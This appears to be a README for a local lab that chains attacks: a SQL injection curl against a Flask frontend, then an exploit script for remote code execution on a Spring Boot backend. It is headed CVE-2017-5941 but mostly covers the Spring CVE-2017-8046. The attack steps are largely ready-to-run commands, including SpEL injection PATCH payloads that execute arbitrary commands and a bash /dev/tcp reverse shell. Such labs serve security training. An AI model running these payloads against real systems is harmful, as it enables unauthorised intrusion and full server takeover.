## CVE-2017-5941
https://nvd.nist.gov/vuln/detail/CVE-2017-5941#range-6741888 \
Target Application: Node \
Software Link: https://www.npmjs.com/package/node-serialize \
Version: 0.0.4 \
Writeup: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ \
Used PoCs: 
* https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html
* https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Steps to Reproduce

## Setup
1- `minikube start`
2- In FlaskVulnerableFrontEnd/kube run `kubectl apply -f vulnerable-frontend-deployment.yaml`
3- In SpringBreakVulnerableApp/kube run `kubectl apply -f springbreak-vulnerable-app-deployment.yaml`
4- Port-forwar both of them with `kubectl port-forward pods/springbreak-vulnerable-app..... 8090:8090` and `kubectl port-forward pods/vulnerable-frontend-.... 5000:5000`

## Attack
1- First the attacker uses SQL Injection to the frontend with known ip and port with `curl "http://localhost:5000/search?query='%20UNION%20SELECT%20id,%20secret_info%20AS%20info%20FROM%20secrets%20--"` and finds the internet endpoint of the backend server.
2- Then with this knowledge attacker runs the exploit.py, `python exploit.py --ip <ip from injection> --port <port from injection>`
3- Attacker has connected a pseudo reverse shell.




## Other ways to create the exploit and its payload
1- To Create server jar in SpringBreakVulnerableApp run `mvn clean install spring-boot:repackage` \
2- Run server `mvn spring-boot:run` \
3- To start server in SpringBreakVulnerableApp run `java -jar -Dserver.port=8090 target/SpringBreakVulnerableApp-1.0.jar --debug` \
4- Create data for exploit `curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://localhost:8090/entity` \
5- To Create exploit jar, in spring-break_cve-2017-8046 run `mvn clean compile package` \
6- To execute commands use ` java -jar spring-break_cve-2017-8046-1.3-jar-with-dependencies.jar --url "http://localhost:8090/entity/1" --command "<command>"` or `curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"<command>\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://localhost:8090/entity/1/"` \

curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"bash -c '\''exec 5<>/dev/tcp/127.0.0.1/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'\'' \").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://localhost:8090/entity/1/"
